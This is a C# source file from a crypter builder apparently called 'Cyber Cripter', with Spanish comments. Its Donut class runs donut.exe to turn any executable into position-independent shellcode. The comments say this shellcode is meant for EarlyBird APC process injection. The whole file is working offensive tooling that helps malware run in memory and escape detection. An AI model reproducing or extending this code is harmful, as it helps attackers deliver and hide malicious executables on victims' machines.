using System;
using System.Diagnostics;
using System.IO;

namespace Cyber_Cripter
{
    // Convierte un .exe arbitrario en shellcode PIC invocando donut.exe como subproceso.
    // Es necesario porque EarlyBird APC ejecuta una dirección de memoria como función,
    // lo que solo funciona con shellcode posicional-independiente, no con un PE (ejecutable).
    // Descarga donut.exe de https://github.com/TheWover/donut/releases y colócalo
    // junto al builder (Cyber-Crypter-main\Cyber Cripter\bin\Debug) o en el PATH.
    internal static class Donut
    {
        // Convierte el .exe de la ruta indicada a shellcode y devuelve los bytes en memoria
        public static byte[] Convert(string inputExePath)
        {
            // Busca archivo donut.exe 
            string donutExe = LocateDonut();
            if (donutExe == null)
                throw new FileNotFoundException(
                    "donut.exe not found. Place it next to the builder (Cyber-Crypter-main\\Cyber Cripter\\bin\\Debug) or on PATH. " +
                    "\nDownload: https://github.com/TheWover/donut/releases");

            // Crear un directorio temporal único para que donut escriba el shellcode
            string tmpDir = Path.Combine(Path.GetTempPath(),
                "cybercripter_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tmpDir);
            string outBin = Path.Combine(tmpDir, "payload.bin");

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = donutExe,
                    // -a 2 = arquitectura x64
                    // -b 1 = bypass AMSI/WLDP desactivado (no es necesario aquí)
                    // -f 1 = formato de salida raw .bin (shellcode puro, no PE)
                    // -o   = ruta del fichero de salida
                    // -i   = ruta del PE de entrada
                    Arguments = string.Format(
                        "-a 2 -b 1 -f 1 -o \"{0}\" -i \"{1}\"", outBin, inputExePath),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = tmpDir
                };

                using (var p = Process.Start(psi))
                {
                    string stdout = p.StandardOutput.ReadToEnd();
                    string stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    // Si donut falla o no genera el fichero de salida, lanzar excepción con detalle
                    if (p.ExitCode != 0 || !File.Exists(outBin))
                        throw new InvalidOperationException(
                            "donut.exe failed (Exit Code: " + p.ExitCode + ").\n" +
                            "stdout:\n" + stdout + "\nstderr:\n" + stderr);
                }

                // Leer el shellcode generado y devolverlo como array de bytes
                return File.ReadAllBytes(outBin);
            }
            finally
            {
                // Eliminar el directorio temporal siempre, aunque haya habido error
                try { Directory.Delete(tmpDir, true); } catch {  }
            }
        }

        // Busca donut.exe: primero junto al builder, luego en cada directorio del PATH
        private static string LocateDonut()
        {
            // Comprobar si está en la misma carpeta que el builder
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            string candidate = Path.Combine(appDir, "donut.exe");
            if (File.Exists(candidate)) return candidate;

            // Recorrer el PATH del sistema buscando donut.exe
            string path = Environment.GetEnvironmentVariable("PATH") ?? "";
            foreach (string dir in path.Split(Path.PathSeparator))
            {
                if (string.IsNullOrEmpty(dir)) continue;
                try
                {
                    string c = Path.Combine(dir, "donut.exe");
                    if (File.Exists(c)) return c;
                }
                catch { /* entrada de PATH inválida, ignorar */ }
            }
            return null;
        }
    }
}
